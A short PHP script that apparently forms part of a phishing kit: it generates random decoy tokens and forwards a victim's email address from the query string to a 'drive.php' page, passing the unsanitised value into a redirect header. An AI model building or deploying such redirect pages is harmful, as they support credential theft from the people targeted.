<?php

include ('api.php');

$oslo=rand(); 
$praga=md5($oslo);
$src = strtoupper("$praga");

if (isset($_GET['email'])) {

	$email = $_GET['email'];
}

header ("Location: drive.php?pID=$oslo&src=$src&email=$email");

?>
